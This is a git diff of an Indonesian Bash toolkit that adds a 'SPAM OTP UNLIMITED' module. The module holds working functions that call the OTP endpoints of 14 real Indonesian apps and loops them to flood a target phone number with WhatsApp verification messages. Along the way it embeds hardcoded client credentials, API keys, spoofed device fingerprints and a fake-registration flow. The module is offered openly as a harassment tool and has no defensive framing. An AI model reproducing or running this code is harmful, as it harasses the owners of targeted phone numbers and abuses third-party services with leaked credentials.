@@ -45,7 +45,7 @@ NC='\033[0m'
 
 #WHATSAPP_CHANNEL_URL="https://whatsapp.com/channel/0029VaznZlq7z4kW00unHZ0e"
 YOUTUBE_URL="https://www.youtube.com/@DanxyOfficial"
-LAGU_YOUTUBE="https://youtu.be/T-A4zIBKtV8" # URL Lagu
+LAGU_YOUTUBE="https://youtu.be/GsQWkVCbZOs" # URL Lagu
 LAPOR_TOOLS_ERROR="https://wa.me/6285741852394?text=*LAPOR TOOLS ERROR BANG*"
 loading() {
 trap 'tput cnorm; kill $! 2>/dev/null' EXIT  # restore cursor & kill animasi
@@ -1175,6 +1175,7 @@ clear
         ;;
        8)
         spam_otp
+        kembali_ke_termux
         ;;
        9)
         generate_password
@@ -1909,79 +1910,244 @@ ngl_spam() {
   done
 }
 
-########################################################################
-#  SPAM OTP MODULE – minimal & fast                                  #
-########################################################################
 spam_otp() {
-  clear
-  echo -e "
-  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${YELLOW}⢸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠤⣤⣄⣀⠀⢸⣿⡀${NC}⠀⠀⣀⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣶⣶⣶⣶⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣇⢀⠀⠀⠀⠀⠀⢀⣾⢿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣴⣀⣴⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣻⣿⣿⣿⣿⣿⢠⣁⠢⣴⣦⣴⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⡇⣿⣷⣌⠹⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣦⣼⠇⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠏⡿⣿⣿⣿⣿⢇⢻⣧⣼⣷⡌⠢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⠛⣋⣭⣭⣶⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢀⣀⣠⣤⣤⣤⣿⣿⣿⣾⣿⣶⣿⣭⣽⣛⠦⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢿⣟⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠰⣝⠛⠉⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠙⠃⠑⠘⠛⡉⣹⣷⣿⡻⠿⢿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣥⡨⢁⠓⠷⢟⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠃⠀⠀⠂⠀⡈⠁⡈⠂⠀⠀⠀⠀⠀⠀⣠⢤⣤⣂⣤⣦⣤⣿⣿⣿⣿⣿⣿⣿⢿⠿⠛⠋⢩⢱⣾⣿⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣶⣶⣿⣿⣿⠿⣿⠘⣦⣤⣤⣿⢷⠁⣷⣇⠀⠀⠀⠀⠀⣰⢦⢰⣶⡆⡴⡀⠀⠀⠀⠀⠀⡶⣼⠄⠿⣷⣤⣤⣾⠈⣿⠿⣿⣿⣿⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀
-⠀⠙⠛⠛⠛⠛⠉⠛⠛⠋⠛⠛⠻⡿⢿⣿⣶⣿⠈⡟⠛⠛⣿⠂⣰⣿⣿⣗⣠⢠⠒⡉⠑⢿⢷⣿⣿⡞⠋⢟⠒⠠⣄⣺⣿⣿⣔⢰⡿⠛⠛⢿⢈⣿⣶⣿⣿⣿⠻⠟⠉⠙⠛⠛⠛⠛⠛⠛⠋⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡄⡄⠀⠀⠀⡞⠉⠉⠉⠁⢇⠉⢀⢀⠛⢻⣿⣿⡿⠞⠃⡀⠀⠪⡀⠈⠉⠉⠌⡸⠀⠀⠀⠸⢸⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢸⣿⣿⣧⠱⠀⠀⠀⠹⣌⠐⠐⠊⠀⠠⡘⡋⣒⡁⢌⡉⠀⠀⠀⠹⢈⠀⠈⠑⠂⡂⣰⠃⠀⠀⢀⠆⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢻⣿⣿⣆⢀⠀⠀⠀⠹⢰⡀⡄⠆⠀⠾⠣⣿⢿⢢⡠⣠⡷⣓⢽⡳⠤⠰⡠⢰⡇⠁⠀⠀⠀⠎⡼⠿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠚⠷⡖⣶⣶⣴⣦⣤⣤⣤⣄⣀⣀⣛⣛⣿⣆⣡⡀⠀⠈⠸⠆⠣⠀⠀⠀${RED}⡒⠰⠦⢶⣠⣶⠶⠆⣂${NC}⣀⣀⠀⡇⣘⣃⣀⣀⣀⣊⣘⣼⡼⠎⠩⡀⢢⠢⠆⠒⠔⠒⠉⠋⠀⠈⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠙⠛⠛⠛⢛⠛⣟⣿⣿⡟⢿⣿⠿⣿⠿⢿⠿⠿⢿⠿⠿⣿⢿⣿⠿⠿⡿⠿⠿⠿⠿⢿⢿⣿⠟⣿⣿⣿⡛⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠈⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⡙⢿⡟⢻⣦⣉⠢⠘⡄⢿⣦⡀${RED}⢘⠿⢛⠮⠭⢷⡛⢟⡁${NC}⢀⣴⡟⣰⠃⠜⣡⣾⡛⢻⣿⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣷⣄⡙⢿⣿⣿⣷⣤⠀⢄⡉⠛⣃⣀⡴⠒⢛⠲⢤⣀⠘⠋⢉⡠⢁⣴⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠋⠛⠋⠂⢈⠛⠿⣿⣷⣤⣉⠻⠟⢁⢀⣠⣤⣄⣀⠉⠿⢛⣁⣤⣾⣿⣿⣿⠿⠋⠹⠛⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠏⠀⠀⠀⠀⠀⠀⠁⠀⠬⣉⠛⠻⢿⣿⣿⣿⣿⣉⣿⣿⣿⣿⣿⣿⣿⠿⠟⠉⠁⠀⠀⠀⠀⠀⠈⠿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠨⢭⣭⣿⣿⠟⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠃⠀⠀"
-  echo -e "${BG_RED}${YELLOW}TEKAN q LALU ENTER UNTUK MENGHENTIKAN SPAM${NC}"
+codex(){
+  tr -dc 'A-Za-z0-9' </dev/urandom | head -c "$1"
+}
 
-  read -p "Nomor target (8xxx atau 62xxx): " raw
-  case $raw in
-    8*)  num="62$raw" ;;
-    62*) num="$raw" ;;
-    *) echo -e "${RED}❌ Format salah.${NC}"; return ;;
-  esac
+fetch_value(){
+  local response=$1 start=$2 end=$3
+  local idx=$(expr index "$response" "$start"); [[ $idx -eq 0 ]] && return
+  idx=$(( idx + ${#start} ))
+  local tail=${response:$idx}
+  idx=$(expr index "$tail" "$end"); [[ $idx -eq 0 ]] && return
+  printf '%s\n' "${tail:0:$(( idx-1 ))}"
+}
 
-  counter=0
-  while :; do
-    ((counter++))
-    echo -e "${YELLOW}[${counter}]${NC} Kirim OTP via ${CYAN}BisaTopup${NC} ..."
+# ---------- daftar API ----------
+bisatopup(){
+  local dev=$(codex 16)
+  local url="https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=${dev}&version_name=6.12.04&version=61204"
+  local payload="phone_number=$1"
+  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url")
+  [[ $(fetch_value "$res" '"message":"' '","') == "OTP akan segera dikirim ke perangkat" ]]
+}
 
-    resp=$(curl -s -X POST \
-      "https://api-mobile.bisatopup.co.id/register/send-verification" \
-      -H "Content-Type: application/x-www-form-urlencoded" \
-      -d "phone_number=${num#62}")
+titipku(){
+  local url="https://titipku.tech/v1/mobile/auth/otp?method=wa"
+  local payload="{\"phone_number\": \"+62$1\", \"message_placeholder\": \"hehe\"}"
+  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json" "$url")
+  [[ $(fetch_value "$res" '"message":"' '","') == "otp sent" ]]
+}
 
-    [[ "$resp" == *"OTP akan segera dikirim"* ]] \
-      && echo -e "    ${GREEN}✅ Terkirim${NC}" \
-      || echo -e "    ${RED}❌ Gagal${NC}"
+jogjakita(){
+  local url_token="https://aci-user.bmsecure.id/oauth/token"
+  local payload_token="grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1"
+  local res_tok=$(curl -s -X POST -d "$payload_token" \
+    -H "Authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    "$url_token")
+  local token=$(fetch_value "$res_tok" '{"access_token":"' '","') || return 1
+  local url_otp="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
+  local payload='{"phone_user":"'$1'","primary_credential":{"device_id":"","fcm_token":"","id_kota":0,"id_user":0,"location":"0.0,0.0","uuid":"","version_code":"501","version_name":"6.10.1","via":"jogjakita_user"},"uuid":"00000000-4c22-250d-3006-9a465f072739","version_code":"5.01","version_name":"6.10.1","via":"jogjakita_user"}'
+  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json" -H "Authorization: Bearer $token" "$url_otp")
+  [[ $(fetch_value "$res" '{"rc":' '","') == "200" ]]
+}
 
-    # cek apakah user menekan q
-    if read -t 2 -n 1 key && [[ $key == "q","a" ]]; then
-      echo -e "\n${GREEN}[+] Berhenti.${NC}"
-      echo -e "${BG_RED}${YELLOW}ENTER UNTUK KEMBALI KE MANU OSIN${NC}"
-      break
+candireload(){
+  local url="https://app.candireload.com/apps/v8/users/req_otp_register_wa"
+  local payload="{\"uuid\": \"b787045b140c631f\", \"phone\": \"$1\"}"
+  local res=$(curl -s -X POST -d "$payload" \
+    -H "Content-Type: application/json" \
+    -H "irsauth: c6738e934fd7ed1db55322e423d81a66" \
+    "$url")
+  [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
+}
+
+speedcash(){
+  local url_token="https://sofia.bmsecure.id/central-api/oauth/token"
+  local res_tok=$(curl -s -X POST -d "grant_type=client_credentials" \
+    -H "Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    "$url_token")
+  local token=$(fetch_value "$res_tok" 'access_token":"' '","') || return 1
+  local uuid=$(codex 8)
+  local url_otp="https://sofia.bmsecure.id/central-api/sc-api/otp/generate"
+  local payload="{\"version_name\":\"6.2.1 (428)\",\"phone\":\"$1\",\"appid\":\"SPEEDCASH\",\"version_code\":428,\"location\":\"0,0\",\"state\":\"REGISTER\",\"type\":\"WA\",\"app_id\":\"SPEEDCASH\",\"uuid\":\"00000000-4c22-250d-ffff-ffff${uuid}\",\"via\":\"BB ANDROID\"}"
+  local res=$(curl -s -X POST -d "$payload" -H "Authorization: Bearer $token" -H "Content-Type: application/json" "$url_otp")
+  [[ $(fetch_value "$res" '"rc":"' '","') == "00" ]]
+}
+
+kerbel(){
+  local url="https://keranjangbelanja.co.id/api/v1/user/otp"
+  local payload="----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n$1\r\n----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"otp\"\r\n\r\n118872\r\n----dio-boundary-0879576676--"
+  local res=$(curl -s -X POST -d "$payload" \
+    -H "content-type: multipart/form-data; boundary=--dio-boundary-0879576676" \
+    "$url")
+  [[ $(fetch_value "$res" '"result":"' '","') == "OTP Berhasil Dikirimkan" ]]
+}
+
+mitradelta(){
+  local url="https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=$1"
+  local res=$(curl -s "$url")
+  [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
+}
+
+agenpayment(){
+  local url_reg="https://agenpayment-app.findig.id/api/v1/user/register"
+  local payload_reg="{\"name\":\"AAD\",\"phone\":\"$1\",\"email\":\"${1}@gmail.com\",\"pin\":\"1111\",\"id_propinsi\":\"5e5005024d44ff5409347111\",\"id_kabupaten\":\"5e614009360fed7c1263fdf6\",\"id_kecamatan\":\"5e614059360fed7c12653764\",\"alamat\":\"aceh\",\"nama_toko\":\"QUARD\",\"alamat_toko\":\"aceh\"}"
+  local res_reg=$(curl -s -X POST -d "$payload_reg" \
+    -H "content-type: application/json; charset=utf-8" \
+    -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
+    "$url_reg")
+  [[ $(fetch_value "$res_reg" '{"status":' '","') == "200" ]] || return 1
+
+  local url_login="https://agenpayment-app.findig.id/api/v1/user/login"
+  local payload_login="{\"phone\":\"$1\",\"pin\":\"1111\"}"
+  local res_login=$(curl -s -X POST -d "$payload_login" \
+    -H "content-type: application/json; charset=utf-8" \
+    -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
+    "$url_login")
+  local vid=$(fetch_value "$res_login" 'validate_id":"' '",') || return 1
+
+  local url_otp="https://agenpayment-app.findig.id/api/v1/user/login/send-otp"
+  local payload_otp="{\"codeLength\":4,\"validate_id\":\"$vid\",\"type\":\"whatsapp\"}"
+  local res=$(curl -s -X POST -d "$payload_otp" \
+    -H "content-type: application/json; charset=utf-8" \
+    -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
+    "$url_otp")
+  [[ $(fetch_value "$res" '{"status":' '","') == "200" ]]
+}
+
+z4reload(){
+  local url="https://api.irmastore.id/apps/otp/v2/sendotpwa"
+  local payload="{\"hp\":\"$1\",\"uuid\":\"MyT2H1xFo2WHoMT5gjdo3W9woys1\",\"app_code\":\"z4reload\"}"
+  local res=$(curl -s -X POST -d "$payload" \
+    -H "content-type: application/json" \
+    -H "authorization: 7117c8f459a98282c2c576b519d0662f" \
+    "$url")
+  [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
+}
+
+singa(){
+  local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
+  local payload="{\"mobile_phone\":\"$1\",\"type\":\"mobile\",\"is_switchable\":1}"
+  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url")
+  [[ $(fetch_value "$res" '"msg":"' '","') == "Success" ]]
+}
+
+ktakilat(){
+  local url="https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode"
+  local payload="{\"mobileNo\":\"$1\",\"smsType\":1}"
+  local headers=(
+    "Content-Type: application/json; charset=UTF-8"
+    "Device-Info: eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0="
+  )
+  local res=$(curl -s -X POST -d "$payload" "${headers[@]/#/-H }" "$url")
+  [[ $(fetch_value "$res" '"msg":"' '","') == "success" ]]
+}
+
+uangme(){
+  local aid="gaid_15497a9b-2669-42cf-ad10-$(codex 12)"
+  local url="https://api.uangme.com/api/v2/sms_code?phone=$1&scene_type=login&send_type=wp"
+  local headers=(
+    "aid:$aid"
+    "android_id:b787045b140c631f"
+    "app_version:300504"
+    "brand:samsung"
+    "carrier:00"
+    "Content-Type:application/x-www-form-urlencoded"
+    "country:510"
+    "dfp:6F95F26E1EEBEC8A1FE4BE741D826AB0"
+    "fcm_reg_id:frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo"
+    "gaid:gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0"
+    "lan:in_ID"
+    "model:SM-G965N"
+    "ns:wifi"
+    "os:1"
+    "timestamp:1732178536"
+    "tz:Asia%2FBangkok"
+    "User-Agent:okhttp/3.12.1"
+    "v:1"
+    "version:28"
+  )
+  local res=$(curl -s "${headers[@]/#/-H }" "$url")
+  [[ $(fetch_value "$res" '{"code":"' '","') == "200" ]]
+}
+
+cairin(){
+  local uuid=$(codex 32)
+  local url="https://app.cairin.id/v2/app/sms/sendWhatAPPOPT"
+  local payload="appVersion=3.0.4&phone=$1&userImei=$uuid"
+  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url")
+  [[ $res == '{"code":"0"}' ]]
+}
+
+adiraku(){
+  local url="https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
+  local payload="{\"mobileNumber\":\"$1\",\"type\":\"prospect-create\",\"channel\":\"whatsapp\"}"
+  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url")
+  [[ $(fetch_value "$res" '{"message":"' '","') == "success" ]]
+}
+
+# ---------- spammer ----------
+spam_whatsapp(){
+  local nomor=$1
+  local apis=(
+    bisatopup
+    titipku
+    jogjakita
+    candireload
+    speedcash
+    kerbel
+    mitradelta
+    agenpayment
+    z4reload
+    singa
+    ktakilat
+    uangme
+    cairin
+    adiraku
+  )
+  for api in "${apis[@]}"; do
+    if "$api" "$nomor" 2>/dev/null; then
+      printf "[ ${RED}∅${NC} ] %-14s → ${RED}GAGAL${NC}\n" "$api"
+    else
+      printf "[ ${GREEN}✓${NC} ] %-14s → ${GREEN}%s${NC}\n" "$api" "$nomor"
+      
     fi
   done
 }
 
+
+# ---------- UI ----------
+clear
+echo -e "\n\n        ${RED}░██████╗░░░░█████╗░████████╗██████╗░
+        ██╔════╝░░░██╔══██╗╚══██╔══╝██╔══██╗
+        ╚█████╗░░░░██║░░██║░░░██║░░░██████╔╝${NC}"
+echo -e "        ${WHITE}░╚═══██╗░░░██║░░██║░░░██║░░░██╔═══╝░
+        ██████╔╝██╗╚█████╔╝░░░██║░░░██║░░░░░
+        ╚═════╝░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░${NC}"
+echo -e "     ${RED}╭────────────────────────────────────────╮${RED}
+     │           ${GREEN}SPAM OTP UNLIMITED${NC}${RED}           │
+     ╰────────────────────────────────────────╯${NC}"
+echo -e "   ${BG_RED}${YELLOW}TEKAN q LALU ENTER UNTUK MENGHENTIKAN SPAM OTP${NC}\n"
+trap 'echo -e "\n\n${YELLOW}Pengiriman dihentikan.${NC}"; exit 0' INT
+while true; do
+  echo -e "   ${GREEN}● ${YELLOW}● ${RED}●"
+   echo -e "   ${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
